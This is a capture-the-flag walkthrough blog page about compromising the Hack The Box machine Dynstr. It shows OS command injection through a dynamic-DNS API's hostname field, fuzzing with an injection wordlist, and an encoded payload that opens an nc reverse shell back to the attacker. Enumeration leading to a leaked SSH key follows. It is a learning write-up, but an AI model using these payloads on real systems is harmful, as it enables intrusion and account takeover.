@@ -1,0 +1,1409 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <!-- start custom head snippets -->
+<!-- Begin Jekyll GTM tag v1.0.3 -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-MF4PLJ5');</script>
+<!-- End Jekyll GTM tag v1.0.3 -->
+
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+<link rel="shortcut icon" href="/assets/images/favicon.ico" />
+
+<!-- Multilang tags -->
+
+    
+<link rel="alternate" hreflang="pt-BR" href="https://davicruz.com/walkthrough/2021/10/htb-dynstr">
+<link rel="alternate" hreflang="x-default" href="https://davicruz.com/walkthrough/2021/10/htb-dynstr">
+    
+
+    
+<link rel="alternate" hreflang="en-US" href="https://davicruz.com/en-US/walkthrough/2021/10/htb-dynstr">
+        
+<link rel="alternate" hreflang="en" href="https://davicruz.com/en-US/walkthrough/2021/10/htb-dynstr">
+        
+    
+
+
+<!-- end custom head snippets -->
+
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Walktrough: HTB Dynstr | Davi Cruz</title>
+<meta name="description" content="Hello guys!  This week’s machine will be Dynstr, another medium-rated Linux box from Hack The Box, created by jkr.">
+
+
+  <meta name="author" content="Davi Cruz">
+  
+  <meta property="article:author" content="Davi Cruz">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Davi Cruz">
+<meta property="og:title" content="Walktrough: HTB Dynstr">
+<meta property="og:url" content="https://davicruz.com/walkthrough/2021/10/htb-dynstr">
+
+
+  <meta property="og:description" content="Hello guys!  This week’s machine will be Dynstr, another medium-rated Linux box from Hack The Box, created by jkr.">
+
+
+
+  <meta property="og:image" content="https://i.imgur.com/89b1SdH.png">
+
+
+
+  <meta name="twitter:site" content="@zerahzurc">
+  <meta name="twitter:title" content="Walktrough: HTB Dynstr">
+  <meta name="twitter:description" content="Hello guys!  This week’s machine will be Dynstr, another medium-rated Linux box from Hack The Box, created by jkr.">
+  <meta name="twitter:url" content="https://davicruz.com/walkthrough/2021/10/htb-dynstr">
+
+  
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://i.imgur.com/89b1SdH.png">
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2021-10-16T13:00:00-03:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://davicruz.com/walkthrough/2021/10/htb-dynstr">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Davi Cruz",
+      "url": "https://davicruz.com/",
+      "sameAs": ["https://twitter.com/zerahzurc","https://www.linkedin.com/in/davicruz","https://github.com/davi-cruz"]
+    
+  }
+</script>
+
+
+  <meta name="google-site-verification" content="hrWV-PqvbpxEy2HdpVYFQNws2Sz_tROleVyF18s2kWA" />
+
+
+  <meta name="msvalidate.01" content="60B1FA6CDAF15D226AB529AF30386BD8">
+
+
+
+  <meta name="yandex-verification" content="08de8d8c0326420f">
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Davi Cruz Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+  </head>
+
+  <body class="layout--single wide">
+    <!-- Begin Jekyll GTM tag v1.0.3 (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MF4PLJ5" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Jekyll GTM tag v1.0.3 (noscript) -->
+
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <!-- CUSTOM: Edit to adjust links to localized page -->
+        
+        
+          <a class="site-logo" href="/en-US"><img src="/assets/images/logo.png" alt="Davi Cruz"></a>
+        
+        <a class="site-title" href="/en-US">
+          Davi Cruz
+          
+        </a>
+        
+        <!-- END CUSTOM: Edit to adjust links to localized page -->
+        <ul class="visible-links">
+          <!-- CUSTOM: Edit to get localized navigation --><li class="masthead__menu-item">
+              <a href="/en-US/categories/">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/en-US/tag/">Tags</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/en-US/about/">About</a>
+            </li>
+<!-- END CUSTOM: Edit to get localized navigation -->
+        </ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="https://davicruz.com/">
+        <img src="/assets/images/bio-photo.jpg" alt="Davi Cruz" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="https://davicruz.com/" itemprop="url">Davi Cruz</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>Just another Cybersecurity professional</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">São Paulo, BR</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://linkedin.com/in/davicruz" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fab fa-linkedin" aria-hidden="true"></i><span class="label">Linkedin</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Walktrough: HTB Dynstr">
+    <meta itemprop="description" content="Hello guys!This week’s machine will be Dynstr, another medium-rated Linux box from Hack The Box, created by jkr.">
+    <meta itemprop="datePublished" content="2021-10-16T13:00:00-03:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="https://davicruz.com/walkthrough/2021/10/htb-dynstr" class="u-url" itemprop="url">Walktrough: HTB Dynstr
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-10-16T13:00:00-03:00">October 16, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          12 minute read
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    <span class="page__meta-lang"><a href="/walkthrough/2021/10/htb-dynstr">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Share</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+        <p>Hello guys!</p>
+
+<p>This week’s machine will be <strong>Dynstr</strong>, another medium-rated Linux box from <a href="https://www.hackthebox.eu/">Hack The Box</a>, created by <a href="https://app.hackthebox.eu/users/77141">jkr</a>.<!--more--></p>
+
+<p class="notice--info"><img class="emoji" title=":information_source:" alt=":information_source:" src="https://github.githubassets.com/images/icons/emoji/unicode/2139.png" height="20" width="20"> <strong>Info</strong>: Write-ups for Hack The Box machines are posted as soon as they’re retired.</p>
+
+<p><img src="https://i.imgur.com/kqW8fwk.png" alt="HTB Dynstr" class="align-center"></p>
+
+<p>Had the opportunity to learn a lot with this box. First while playing with some code injection dictionaries, and later understanding the <code class="language-plaintext highlighter-rouge">nsupdate</code> utility. After getting the code execution and reverse shell, found an RSA private key to be used with SSH, but had to overcome some restrictions on the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file to get another user account. Finally, to get <code class="language-plaintext highlighter-rouge">root</code>, played with globbing to get an escalation opportunity on the box.</p>
+
+<p>I hope you guys enjoy it!</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>As usual, started enumerating published services using a <code class="language-plaintext highlighter-rouge">nmap</code> quick scan.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.244
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-11 18:32 <span class="nt">-03</span>
+Nmap scan report <span class="k">for </span>10.10.10.244
+Host is up <span class="o">(</span>0.072s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e <span class="o">(</span>RSA<span class="o">)</span>
+|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c <span class="o">(</span>ED25519<span class="o">)</span>
+53/tcp open  domain  ISC BIND 9.16.1 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>
+| dns-nsid:
+|_  bind.version: 9.16.1-Ubuntu
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Dyna DNS
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>17.02 seconds
+</code></pre></div></div>
+
+<p>Checking the initial scan output we can see a DNS Service, as well as an HTTP website published. Before looking into the DNS Service, let’s see which kind of information the website can give us.</p>
+
+<h3 id="80tcp---http-service">80/TCP - HTTP Service</h3>
+
+<p>Accessing the webpage, as mentioned in the title, talks about a Dyna DNS company, a company like <a href="https://no-ip.com">No-IP</a> which allows you to register a DNS entry and dynamically update it, making it easier to access your resources when you don’t own a static IP address.</p>
+
+<p><img src="https://i.imgur.com/gtdmYDI.jpg" alt="HTB Dynstr - Dyna DNS" class="align-center"></p>
+
+<p>Besides a single-page application, this website contains especially useful information in the section <em>Our Services</em>, that will be valuable to us during this box resolution, as well as the domain <code class="language-plaintext highlighter-rouge">dynadns.htb</code>, used in the e-mail address in the footer:</p>
+
+<p><img src="https://i.imgur.com/QZvDDXJ.png" alt="HTB Dynstr - Dyna DNS Services" class="align-center"></p>
+
+<ul>
+  <li>Application for DNS registration uses the same API as <code class="language-plaintext highlighter-rouge">no-ip.com</code>, as available in their documentation at <a href="https://www.noip.com/integrate/request">Integrate with No-IP DDNS - API Information (noip.com)</a>.</li>
+  <li>The domains that could be used for this service are listed, which were later added to the local hosts file.</li>
+  <li>Demo credentials were provided, so we can start playing with the API <img class="emoji" title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20">
+</li>
+</ul>
+
+<h4 id="interacting-with-the-api">Interacting with the API</h4>
+
+<p>According to No-IP documentation, the API can be found at <code class="language-plaintext highlighter-rouge">/nic/update</code> and requires Basic authentication, where a GET request containing the IP and the hostname to be updated is the main feature of this API, as the example below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'dynadns:sndanyd'</span> | <span class="nb">base64
+</span>ZHluYWRuczpzbmRhbnlk
+<span class="nv">$ </span>curl <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-H</span> <span class="s1">$'Authorization: Basic ZHluYWRuczpzbmRhbnlk'</span> <span class="s2">"http://10.10.10.244/nic/update?myip=10.10.10.10&amp;hostname=myhostname.no-ip.htb"</span> <span class="nt">-v</span>
+<span class="k">*</span>   Trying 10.10.10.244:80...
+<span class="k">*</span> Connected to 10.10.10.244 <span class="o">(</span>10.10.10.244<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
+<span class="o">&gt;</span> GET /nic/update?myip<span class="o">=</span>10.10.10.10&amp;hostname<span class="o">=</span>myhostname.no-ip.htb HTTP/1.1
+<span class="o">&gt;</span> Host: 10.10.10.244
+<span class="o">&gt;</span> User-Agent: curl/7.74.0
+<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
+<span class="o">&gt;</span> Authorization: Basic ZHluYWRuczpzbmRhbnlk
+<span class="o">&gt;</span>
+<span class="k">*</span> Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 200 OK
+HTTP/1.1 200 OK
+&lt; Date: Fri, 13 Aug 2021 21:36:36 GMT
+Date: Fri, 13 Aug 2021 21:36:36 GMT
+&lt; Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+&lt; Content-Length: 18
+Content-Length: 18
+&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+
+&lt;
+good 10.10.10.10
+<span class="k">*</span> Connection <span class="c">#0 to host 10.10.10.244 left intact</span>
+</code></pre></div></div>
+
+<p>Playing a little with the API started receiving some <strong>wrngdom</strong> errors when some of the supported domains are not present, like below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-H</span> <span class="s1">$'Authorization: Basic ZHluYWRuczpzbmRhbnlk'</span> <span class="s2">"http://10.10.10.244/nic/update?myip=10.10.10.10&amp;hostname=;pwd"</span> <span class="nt">-v</span>
+<span class="k">*</span>   Trying 10.10.10.244:80...
+<span class="k">*</span> Connected to 10.10.10.244 <span class="o">(</span>10.10.10.244<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
+<span class="o">&gt;</span> GET /nic/update?myip<span class="o">=</span>10.10.10.10&amp;hostname<span class="o">=</span><span class="p">;</span><span class="nb">pwd </span>HTTP/1.1
+<span class="o">&gt;</span> Host: 10.10.10.244
+<span class="o">&gt;</span> User-Agent: curl/7.74.0
+<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
+<span class="o">&gt;</span> Authorization: Basic ZHluYWRuczpzbmRhbnlk
+<span class="o">&gt;</span>
+<span class="k">*</span> Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 200 OK
+HTTP/1.1 200 OK
+&lt; Date: Fri, 13 Aug 2021 21:38:23 GMT
+Date: Fri, 13 Aug 2021 21:38:23 GMT
+&lt; Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+&lt; Content-Length: 16
+Content-Length: 16
+&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+
+&lt;
+911 <span class="o">[</span>wrngdom: <span class="o">]</span>
+<span class="k">*</span> Connection <span class="c">#0 to host 10.10.10.244 left intact</span>
+</code></pre></div></div>
+
+<p>So, to check for injections started to fuzz using a simple <code class="language-plaintext highlighter-rouge">while</code> loop for contents of wordlist <code class="language-plaintext highlighter-rouge">/usr/share/wordlists/wfuzz/Injections/All_attack.txt</code>, until getting the error below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="k">while </span><span class="nb">read </span>p<span class="p">;</span> <span class="k">do
+while</span><span class="o">&gt;</span> curl <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-H</span> <span class="s1">$'Authorization: Basic ZHluYWRuczpzbmRhbnlk'</span> <span class="s2">"http://10.10.10.244/nic/update?myip=10.10.10.10&amp;hostname==</span><span class="nv">$p</span><span class="s2">.no-ip.htb"</span> <span class="nt">-v</span>
+<span class="k">while</span><span class="o">&gt;</span> <span class="k">done</span> &lt; /usr/share/wordlists/wfuzz/Injections/All_attack.txt
+
+<span class="o">[</span>...]
+<span class="k">*</span> Connection <span class="c">#0 to host 10.10.10.244 left intact</span>
+<span class="k">*</span>   Trying 10.10.10.244:80...
+<span class="k">*</span> Connected to 10.10.10.244 <span class="o">(</span>10.10.10.244<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
+<span class="o">&gt;</span> GET /nic/update?myip<span class="o">=</span>10.10.10.10&amp;hostname<span class="o">=</span><span class="nt">-1</span>.no-ip.htb HTTP/1.1
+<span class="o">&gt;</span> Host: 10.10.10.244
+<span class="o">&gt;</span> User-Agent: curl/7.74.0
+<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
+<span class="o">&gt;</span> Authorization: Basic ZHluYWRuczpzbmRhbnlk
+<span class="o">&gt;</span>
+<span class="k">*</span> Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 200 OK
+HTTP/1.1 200 OK
+&lt; Date: Fri, 13 Aug 2021 21:30:11 GMT
+Date: Fri, 13 Aug 2021 21:30:11 GMT
+&lt; Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+&lt; Content-Length: 22
+Content-Length: 22
+&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+
+&lt;
+911 <span class="o">[</span>nsupdate failed]
+</code></pre></div></div>
+
+<p>As it mentions that <code class="language-plaintext highlighter-rouge">nsupdate</code> has failed with the payload sent (in this case <code class="language-plaintext highlighter-rouge">-1.no-ip.htb</code>) this means that the API triggers this binary in a non-interactive way. Doing some research, I have found on this page <a href="https://www.rtfm-sarl.ch/articles/using-nsupdate.html">Using the dynamic DNS editor, nsupdate (rtfm-sarl.ch)</a> some examples of usage that could be hijacked to get code execution in the backend, once it accepts standard input, which might be the way used in the automation that updates DNS entries in the zones.</p>
+
+<p>To prove if this is correct, I made a simple test, encapsulating the commands I wanted to be executed in <code class="language-plaintext highlighter-rouge">$()</code>, and checked the DNS entry using <code class="language-plaintext highlighter-rouge">dig</code>, which returned success.</p>
+
+<p><img src="https://i.imgur.com/r5qrIOo.png" alt="HTB Dynstr - OS Code injection payload" class="align-center"></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>dig @10.10.10.244 mytestsubdomain.no-ip.htb
+
+<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.16.15-Debian &lt;&lt;<span class="o">&gt;&gt;</span> @10.10.10.244 mytestsubdomain.no-ip.htb
+<span class="p">;</span> <span class="o">(</span>1 server found<span class="o">)</span>
+<span class="p">;;</span> global options: +cmd
+<span class="p">;;</span> Got answer:
+<span class="p">;;</span> -&gt;&gt;HEADER<span class="o">&lt;&lt;-</span> <span class="no">opcode</span><span class="sh">: QUERY, status: NOERROR, id: 20816
+;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+;; WARNING: recursion requested but not available
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+; COOKIE: c46a9e70a58d51c501000000611a665bf50e119ef07ea985 (good)
+;; QUESTION SECTION:
+;mytestsubdomain.no-ip.htb.     IN      A
+
+;; ANSWER SECTION:
+mytestsubdomain.no-ip.htb. 30   IN      A       10.10.10.11
+
+;; Query time: 68 msec
+;; SERVER: 10.10.10.244#53(10.10.10.244)
+;; WHEN: Mon Aug 16 10:21:33 -03 2021
+;; MSG SIZE  rcvd: 98
+</span></code></pre></div></div>
+
+<p>Now that we have confirmed that we can get code execution this way, modified the request to start a reverse shell using a base64 encoded payload, avoiding encoding issues</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/nic/update?myip=10.10.10.11&amp;hostname=%24%28%65%63%68%6f%20%63%6d%30%67%4c%33%52%74%63%43%39%6d%4f%32%31%72%5a%6d%6c%6d%62%79%41%76%64%47%31%77%4c%32%59%37%59%32%46%30%49%43%39%30%62%58%41%76%5a%6e%77%76%59%6d%6c%75%4c%33%4e%6f%49%43%31%70%49%44%49%2b%4a%6a%46%38%62%6d%4d%67%4d%54%41%75%4d%54%41%75%4d%54%51%75%4d%54%49%78%49%44%51%30%4e%44%4d%67%50%69%39%30%62%58%41%76%5a%67%3d%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%29.no-ip.htb</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.10.244</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">python-requests/2.25.1</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Authorization</span><span class="p">:</span> <span class="s">Basic ZHluYWRuczpzbmRhbnlk</span>
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<p>Started enumeration using the obtained account <code class="language-plaintext highlighter-rouge">www-data</code>, default for apache, using <code class="language-plaintext highlighter-rouge">linpeas.sh</code>, where the following items were identified:</p>
+
+<ul>
+  <li>Users with console and their permissions:</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uid=0(root) gid=0(root) groups=0(root)
+uid=1000(dyna) gid=1000(dyna) groups=1000(dyna),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
+uid=1001(bindmgr) gid=1001(bindmgr) groups=1001(bindmgr)
+</code></pre></div></div>
+
+<ul>
+  <li>Ability to list files inside others home directories, where we can see some SSH Keys for <code class="language-plaintext highlighter-rouge">bindmgr</code> account</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╔══════════╣ Files inside others home (limit 20)                                                                             /home/bindmgr/support-case-C62796521/strace-C62796521.txt
+/home/bindmgr/support-case-C62796521/C62796521-debugging.script
+/home/bindmgr/support-case-C62796521/C62796521-debugging.timing
+/home/bindmgr/support-case-C62796521/command-output-C62796521.txt
+/home/bindmgr/user.txt
+/home/bindmgr/.ssh/known_hosts
+/home/bindmgr/.ssh/id_rsa.pub
+/home/bindmgr/.ssh/authorized_keys
+/home/bindmgr/.ssh/id_rsa
+/home/bindmgr/.bashrc
+/home/bindmgr/.bash_logout
+/home/bindmgr/.profile
+/home/dyna/.bashrc
+/home/dyna/.bash_logout
+/home/dyna/.profile
+/home/dyna/.sudo_as_admin_successful
+</code></pre></div></div>
+
+<p>Checking the contents of <code class="language-plaintext highlighter-rouge">/home/bindmgr</code>, we can see the <code class="language-plaintext highlighter-rouge">user.txt</code> file but we have no read rights on it. In this user’s profile, there’s also a folder called <code class="language-plaintext highlighter-rouge">support-case-C62796521</code>, which contains some debugging/tracing output from some tasks executed in the server.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@dynstr:/var/www<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /home/bindmgr/
+total 36
+drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 <span class="nb">.</span>
+drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..
+lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -&gt; /dev/null
+<span class="nt">-rw-r--r--</span> 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
+drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache
+<span class="nt">-rw-r--r--</span> 1 bindmgr bindmgr  807 Feb 25  2020 .profile
+drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh
+drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
+<span class="nt">-r--------</span> 1 bindmgr bindmgr   33 Aug 16 15:49 user.txt
+www-data@dynstr:/var/www<span class="err">$</span>
+</code></pre></div></div>
+
+<p>After analyzing the files, noticed that in <code class="language-plaintext highlighter-rouge">strace-C62796521.txt</code> we have the private key in plain text, which was extracted and saved as an <code class="language-plaintext highlighter-rouge">id_rsa</code> file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
